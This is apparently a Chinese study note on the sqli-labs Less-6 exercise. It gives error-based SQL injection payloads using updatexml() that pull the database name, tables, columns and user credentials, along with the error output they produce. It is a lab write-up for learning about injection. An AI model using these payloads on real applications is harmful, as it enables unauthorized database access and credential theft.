---
title: less6
url: https://www.yuque.com/u29002979/ep2zrx/dwu3xvhhfplpb1gg
---

```bash
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

`?id=1"`

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"" LIMIT 0,1' at line 1

less6与less5的唯一区别在于闭合方式为双引号"\ <a name="MK1Je"></a>

# 用updatexml()函数进行报错注入

updatexml(1,1,1) <a name="nAWtm"></a>

## 查看数据库名称

`?id=1" or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+`

> XPATH syntax error: '~security'

<a name="CeOmH"></a>

## 查看数据表名称

`?id=1" or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+`

> XPATH syntax error: '~emails,referers,uagents,users~'

<a name="vqZkZ"></a>

## 查看字段名称

`?id=1" or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e),1)--+`

> XPATH syntax error: '~id,username,password~'

<a name="dltOi"></a>

## 查看字段内容

`?id=1" or updatexml(1,concat(0x7e,(select group_concat(concat(username,' ^ ',password)) from users),0x7e),1)--+`

> XPATH syntax error: '~Dumb ^ Dumb,Angelina ^ I-kill-y'

substring(1,2,3)
`?id=1" or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,' ^ ',password)) from users),32,31),0x7e),1)--+`

> XPATH syntax error: '~ou,Dummy ^ p@ssword,secure ^ cr'

......
